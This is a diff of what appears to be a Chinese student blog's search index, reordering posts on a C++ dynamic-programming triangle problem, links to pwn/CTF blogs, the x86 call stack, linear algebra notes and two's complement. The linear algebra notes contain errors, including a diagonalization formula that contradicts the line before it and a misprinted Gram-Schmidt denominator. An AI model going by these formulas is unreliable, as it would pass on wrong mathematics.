+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>算法</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>大牛的博客(学习用)</title>
+    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
+    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
+<span id="more"></span>
+<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
+<p><a href="https://godjj.top/">https://godjj.top/</a></p>
+<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
+<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
+<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
+<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>函数调用栈</title>
+    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
+    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
+<span id="more"></span>
+<h4 id="函数开始">函数开始</h4>
+<p>如图：</p>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
+<h4 id="函数结束">函数结束</h4>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>线代预习一些知识</title>
+    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
+<span id="more"></span>
+<ul>
+<li>
+<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
+</li>
+<li>
+<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
+</li>
+<li>
+<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
+<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
+</li>
+<li>
+<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
+</li>
+<li>
+<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
+</li>
+<li>
+<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
+<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
+</li>
+</ul>
+<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
+<ol>
+<li>
+<p>$$|2*A|=2^n*x$$</p>
+</li>
+<li>
+<p>$$|-A|=(-1)^n*x$$</p>
+</li>
+<li>
+<p>$$|A^2|=x^2$$</p>
+</li>
+<li>
+<p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
+</li>
+</ol>
+<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
+<p>矩阵可逆可推出列空间是$R^3$</p>
+<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
+<p>列空间的维数是他的秩</p>
+<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
+<h4 id="克雷默法则">克雷默法则</h4>
+<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
+<h4 id="公式">公式</h4>
+<p>$$A^-1=\frac{C\tau}{|A|}$$</p>
+<p>$$A*C\tau=|A|*I$$</p>
+<h4 id="特征值与特征向量">特征值与特征向量</h4>
+<p>特征值的和=矩阵左上右下对角线的和</p>
+<p>特征值的乘积等于矩阵的行列式</p>
+<h4 id="对角化">对角化</h4>
+<p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
+<p>X则是特征向量的集合的矩阵</p>
+<p>A是原矩阵</p>
+<p>有公式：</p>
+<p>$$\Lambda=X^-1*A*X$$</p>
+<p>$$A=X^-1*\Lambda*X$$</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>线性代数</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>位运算</title>
     <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
     <content><![CDATA[<p>位运算基础概念以及题目：</p>
@@ -525,23 +646,9 @@
         <category>算法</category>
       </categories>
       <tags>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>函数调用栈</title>
-    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
-    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
-<span id="more"></span>
-<h4 id="函数开始">函数开始</h4>
-<p>如图：</p>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
-<h4 id="函数结束">函数结束</h4>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
-]]></content>
   </entry>
   <entry>
     <title>基础算法01</title>
@@ -587,32 +694,8 @@
         <category>算法</category>
       </categories>
       <tags>
-        <tag>C++</tag>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
-<span id="more"></span>
-<h4 id="例题一">例题一</h4>
-<p>先来看一道很简单的例题：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png" alt=""></p>
-<p>具体要求如下：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png" alt=""></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
         <tag>C++</tag>
-        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -650,111 +733,8 @@
 <p><img src="https://s3.uuu.ovh/imgs/2022/11/27/740b7c1d4bcf290d.png" alt=""></p>
 ]]></content>
       <tags>
-        <tag>C++</tag>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>大牛的博客(学习用)</title>
-    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
-    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
-<span id="more"></span>
-<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
-<p><a href="https://godjj.top/">https://godjj.top/</a></p>
-<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
-<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
-<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
-<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>线代预习一些知识</title>
-    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
-<span id="more"></span>
-<ul>
-<li>
-<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
-</li>
-<li>
-<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
-</li>
-<li>
-<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
-<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
-</li>
-<li>
-<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
-</li>
-<li>
-<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
-</li>
-<li>
-<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
-<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
-</li>
-</ul>
-<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
-<ol>
-<li>
-<p>$$|2*A|=2^n*x$$</p>
-</li>
-<li>
-<p>$$|-A|=(-1)^n*x$$</p>
-</li>
-<li>
-<p>$$|A^2|=x^2$$</p>
-</li>
-<li>
-<p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
-</li>
-</ol>
-<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
-<p>矩阵可逆可推出列空间是$R^3$</p>
-<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
-<p>列空间的维数是他的秩</p>
-<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
-<h4 id="克雷默法则">克雷默法则</h4>
-<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
-<h4 id="公式">公式</h4>
-<p>$$A^-1=\frac{C\tau}{|A|}$$</p>
-<p>$$A*C\tau=|A|*I$$</p>
-<h4 id="特征值与特征向量">特征值与特征向量</h4>
-<p>特征值的和=矩阵左上右下对角线的和</p>
-<p>特征值的乘积等于矩阵的行列式</p>
-<h4 id="对角化">对角化</h4>
-<p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
-<p>X则是特征向量的集合的矩阵</p>
-<p>A是原矩阵</p>
-<p>有公式：</p>
-<p>$$\Lambda=X^-1*A*X$$</p>
-<p>$$A=X^-1*\Lambda*X$$</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>线性代数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>大一下预习计算机体系结构</p>
-<span id="more"></span>
-<h4 id="原码反码补码">原码反码补码</h4>
-<ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
-</ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>计算机原理</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -883,6 +863,26 @@
       <tags>
         <tag>语法</tag>
         <tag>markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>大一下预习计算机体系结构</p>
+<span id="more"></span>
+<h4 id="原码反码补码">原码反码补码</h4>
+<ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>计算机原理</tag>
       </tags>
   </entry>
   <entry>
